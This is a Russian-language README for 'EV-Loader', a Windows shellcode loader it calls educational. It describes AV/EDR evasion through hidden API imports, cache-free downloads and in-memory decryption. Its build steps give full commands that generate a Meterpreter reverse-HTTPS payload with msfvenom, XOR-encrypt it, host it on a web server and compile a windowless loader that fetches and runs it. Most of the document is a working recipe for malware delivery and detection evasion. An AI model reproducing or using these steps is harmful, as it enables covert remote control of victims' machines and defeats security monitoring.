# EV-Loader

> Учебный проект — потоковый запуск шелл-кода через WinINet и LLVM на C++

Нативный загрузчик (loader) для Windows, выполняющий потоковое скачивание зашифрованных бинарных данных по HTTP, их расшифровку в памяти процесса и передачу управления — без сохранения промежуточных файлов на диск.

Проект разработан в целях изучения механизмов Windows API, легитимных техник управления памятью и методов оптимизации компилятора LLVM.

## Архитектурные особенности

Для минимизации ложных срабатываний AV/EDR-систем в проекте реализованы следующие механизмы:

### 1. Динамическое разрешение API (обход IAT)

Ключевые функции управления памятью и потоками (`VirtualAlloc`, `VirtualProtect`, `CreateThread`) не импортируются явно. Их адреса разрешаются на этапе выполнения через `GetModuleHandleW` и `GetProcAddress`, что полностью скрывает их из таблицы импорта (IAT) исполняемого файла.

### 2. Изоляция памяти от диска (Anti-Forensics)

Сетевой запрос выполняется с флагом `INTERNET_FLAG_NO_CACHE_WRITE`, запрещающим подсистеме WinINet кэшировать загружаемый файл во временных директориях Windows (`INetCache`). Это предотвращает файловый сигнатурный анализ.

### 3. Разделение примитивов памяти (W^X)

Память под шелл-код изначально выделяется с правами `PAGE_READWRITE` (`0x04`). Флаг исполнения `PAGE_EXECUTE_READ` (`0x20`) присваивается региону только **после** завершения записи данных через `VirtualProtect`. Одновременное использование `PAGE_EXECUTE_READWRITE` исключено.

### 4. In-Memory дешифрование

Данные передаются по сети в зашифрованном виде (алгоритм XOR). Расшифровка происходит «на лету» непосредственно в буфере кучи (Heap) перед копированием в исполняемый регион памяти.

## Процесс сборки

Сборка выполняется на Linux (рекомендуется Kali Linux) с использованием **LLVM/Clang 21** и пассов оптимизации `opt` для трансформации промежуточного представления (IR).

### Шаг 1 — Подготовка зашифрованных данных
Создайте бинарный файл (`shellcode.bin`)

```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST={IP} LPORT={PORT} -f raw > shellcode.bin
```

Зашифруйте исходный бинарный файл (`shellcode.bin`) с ключом `0x5A`:

```bash
python3 -c 'import sys; data = open("shellcode.bin", "rb").read(); open("data.enc", "wb").write(bytearray([b ^ 0x5A for b in data]))'
```

Разместите полученный `data.enc` на веб-сервере:

```bash
python3 -m http.server 9090
```

### Шаг 2 — Генерация LLVM IR

Компиляция исходного кода C++ в промежуточное представление LLVM:

```bash
clang++-21 -S -emit-llvm -target x86_64-pc-windows-gnu \
  /home/kali/Desktop/loader.cpp \
  -o /home/kali/Desktop/loader.ll
```

### Шаг 3 — Оптимизация графа потока управления

**Пасс 1** — упрощение CFG и приведение циклов к каноническому виду:

```bash
opt-21 -passes="simplifycfg,loop-simplify,lcssa" \
  /home/kali/Desktop/loader.ll \
  -S -o /home/kali/Desktop/loader_opt.ll
```

**Пасс 2** — комбинация инструкций и глобальное нумерование значений (GVN):

```bash
opt-21 -passes="instcombine,reassociate,gvn" \
  /home/kali/Desktop/loader_opt.ll \
  -S -o /home/kali/Desktop/loader_opt2.ll
```

### Шаг 4 — Компиляция финального PE-файла

```bash
clang++-21 -target x86_64-pc-windows-gnu \
  /home/kali/Desktop/loader_opt2.ll \
  -o /home/kali/Desktop/loader_base.exe \
  -lkernel32 -luser32 -lwininet \
  -static -mwindows
```

| Флаг | Описание |
|---|---|
| `-target x86_64-pc-windows-gnu` | Архитектура x64, среда выполнения Windows |
| `-lwininet` | Линковка WinINet для поддержки HTTP-сессий |
| `-static` | Автономный бинарный файл со всеми зависимостями |
| `-mwindows` | GUI-приложение без консольного окна при запуске |
